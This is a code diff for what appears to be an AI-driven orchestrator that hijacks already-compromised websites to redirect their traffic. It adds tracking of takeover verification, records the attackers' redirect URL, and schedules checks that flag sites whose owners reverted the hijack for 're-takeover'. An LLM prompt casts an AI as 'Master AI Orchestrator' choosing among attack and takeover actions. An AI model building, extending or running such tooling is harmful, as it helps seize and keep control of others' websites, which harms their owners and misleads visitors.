@@ -105,6 +105,9 @@ export interface WorldState {
     awaitingTakeover: number;
     takenOver: number;
     highPriority: number;
+    pendingVerification: number;
+    verifiedSuccess: number;
+    verifiedReverted: number;
   };
 }
 
@@ -280,11 +283,15 @@ async function observe(): Promise<WorldState> {
     isHacked: hackedSiteDetections.isHacked,
     takeoverStatus: hackedSiteDetections.takeoverStatus,
     priority: hackedSiteDetections.priority,
+    verificationStatus: hackedSiteDetections.verificationStatus,
   }).from(hackedSiteDetections);
   const hackedOnly = allHackedSites.filter(s => s.isHacked);
   const awaitingTakeover = hackedOnly.filter(s => s.takeoverStatus === "not_attempted");
   const takenOver = hackedOnly.filter(s => s.takeoverStatus === "success");
   const highPriority = hackedOnly.filter(s => s.priority >= 8);
+  const pendingVerification = hackedOnly.filter(s => s.verificationStatus === "pending");
+  const verifiedSuccess = hackedOnly.filter(s => s.verificationStatus === "verified_success");
+  const verifiedReverted = hackedOnly.filter(s => s.verificationStatus === "verified_reverted");
 
   // Task queue stats
   const [queuedTasks] = await (await getDb())!.select({ count: count() })
@@ -352,6 +359,9 @@ async function observe(): Promise<WorldState> {
       awaitingTakeover: awaitingTakeover.length,
       takenOver: takenOver.length,
       highPriority: highPriority.length,
+      pendingVerification: pendingVerification.length,
+      verifiedSuccess: verifiedSuccess.length,
+      verifiedReverted: verifiedReverted.length,
     },
   };
 }
@@ -436,7 +446,7 @@ async function decide(
     discovery: ["discovery_search", "discovery_score", "discovery_queue_attack"],
     rank: ["rank_check", "rank_bulk_check", "rank_competitor_analysis"],
     autobid: ["autobid_scan", "autobid_analyze", "autobid_execute"],
-    redirect_takeover: ["takeover_scan_targets", "takeover_batch_scan", "takeover_execute", "takeover_scan_serp_targets"],
+    redirect_takeover: ["takeover_scan_targets", "takeover_batch_scan", "takeover_execute", "takeover_scan_serp_targets", "takeover_verify_pending"],
   };
 
   const prompt = `You are the Master AI Orchestrator. Based on your analysis, decide what actions to take.
@@ -451,6 +461,7 @@ WORLD STATE SUMMARY:
 - Tasks: ${worldState.tasks.queued} queued, ${worldState.tasks.running} running
 - Attack: ${worldState.attack.successfulDeploys} successful deploys
 - Hacked Sites: ${worldState.hackedSites.totalDetected} detected, ${worldState.hackedSites.awaitingTakeover} awaiting takeover, ${worldState.hackedSites.highPriority} high-priority
+- Verification: ${worldState.hackedSites.pendingVerification} pending, ${worldState.hackedSites.verifiedSuccess} verified success, ${worldState.hackedSites.verifiedReverted} reverted (need re-takeover)
 
 ENABLED SUBSYSTEMS: ${enabledSystems.join(", ")}
 REMAINING ACTIONS TODAY: ${remainingActions}
@@ -871,8 +882,37 @@ async function executeTask(task: AiTaskQueueRow): Promise<Record<string, unknown
           takeoverMethod: successMethod,
           takeoverResult: JSON.stringify(results),
           takeoverAt: new Date(),
+          ourRedirectUrl: ourRedirectUrl,
         }).where(eq(hackedSiteDetections.domain, targetDomain));
+        
+        // Auto-schedule verification if takeover succeeded
+        if (anySuccess) {
+          try {
+            const { scheduleVerification } = await import("./takeover-verifier");
+            const { desc: descOrd } = await import("drizzle-orm");
+            const [site] = await db.select({ id: hackedSiteDetections.id })
+              .from(hackedSiteDetections)
+              .where(eq(hackedSiteDetections.domain, targetDomain))
+              .orderBy(descOrd(hackedSiteDetections.id))
+              .limit(1);
+            if (site) {
+              await scheduleVerification(site.id, ourRedirectUrl);
+              console.log(`[Orchestrator] Verification scheduled for ${targetDomain} (site #${site.id})`);
+            }
+          } catch (e: any) {
+            console.error(`[Orchestrator] Failed to schedule verification:`, e?.message);
+          }
+        }
+        
         return { action: taskType, status: anySuccess ? "completed" : "failed", method: successMethod, results: results.length };
+      }
+      
+      // ─── Takeover Verification (background) ───
+      if (taskType === "takeover_verify_pending") {
+        const { processPendingVerifications } = await import("./takeover-verifier");
+        const verifyResult = await processPendingVerifications();
+        console.log(`[Orchestrator] Verification processed: ${verifyResult.processed} sites (${verifyResult.verified} verified, ${verifyResult.reverted} reverted, ${verifyResult.retried} retried)`);
+        return { action: taskType, status: "completed", ...verifyResult };
       }
       
       return { action: taskType, status: "dispatched" };
